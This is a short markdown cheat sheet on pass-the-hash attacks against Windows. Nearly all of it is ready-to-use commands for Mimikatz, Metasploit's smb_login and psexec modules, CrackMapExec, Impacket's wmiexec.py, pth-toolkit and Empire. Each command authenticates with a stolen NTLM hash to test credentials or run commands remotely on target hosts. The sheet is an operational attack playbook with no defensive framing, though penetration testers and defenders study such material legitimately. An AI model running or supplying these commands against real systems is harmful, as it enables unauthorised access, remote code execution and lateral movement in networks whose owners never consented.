# How-To Pass-the-hash (PtH)
You can use many many tools to perform PtH. The only required things are:
* A username (and its domain if not local...)
* Its NTLM hash

## Mimikatz
### Original binary
```
mimikatz # sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTLM>
```

### Powershell version
```
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTLM> /run:powershell.exe"'
```

## Metasploit
1. Testing credentials
```
msf > use auxiliary/scanner/smb/smb_login
msf auxiliary(smb_login) > set RHOSTS <hosts>
RHOSTS => <host>
msf auxiliary(smb_login) > set SMBDomain <domain>
SMBDOMAIN => <domain>
msf auxiliary(smb_login) > set SMBUser <user>
SMBUser => <user>
msf auxiliary(smb_login) > set SMBPass <LM>:<NTLM>
SMBPass => <LM>:<NTLM>
msf auxiliary(smb_login) > run
```
> If you were using msfconsole and stored your network scans within its database you could use
**services -p 445 -R** to to populate RHOSTS with every host with 445 open

2. Exploit
```
msf > use windows/smb/psexec
msf exploit(psexec) > set RHOST <host>
RHOST => <host>
msf exploit(psexec) > set SMBUser <username>
SMBUser => <username>
msf exploit(psexec) > set SMBPass <LM>:<NTLM>
SMBPass => <LM>:<NTLM>
msf exploit(psexec) > exploit
```
> You could also use **auxiliary/admin/smb/psexec_command**

## CrackMapExec
https://github.com/byt3bl33d3r/CrackMapExec
```
#~ crackmapexec <proto> <target(s)> [-d <domain>] -u <user> -H <NTLM>
```
> CME for Windows: https://github.com/maaaaz/CrackMapExecWin/wiki/How-to-compile-CrackMapExec-for-Windows

## Impacket
https://github.com/CoreSecurity/impacket/
* psexec.py
* smbexec.py
* wmiexec.py
* atexec.py
* dcomexec.py
* etc.

Example:
```
python wmiexec.py -hashes :<ntlm> <user>@<server_fqdn>
```
> Impacket examples for Windows: https://github.com/maaaaz/impacket-examples-windows

## pth-toolkit
* pth-net
* pth-rpcclient
* pth-smbclient
* pth-smbget
* pth-winexe
* pth-wmic
* pth-wmis
> pth-* uses the format <domain>/<user>%h<LM>:<NTLM>

Example:
```
pth-winexe -U <domain>/<user>%h<LM>:<NTLM> //<server_fqdn> cmd.exe
```

## Empire
```
(Empire: <agent_name>) > pth <credID>
```
> Pass-the-hash through Invoke-Mimikaz's sekurlsa::pth function
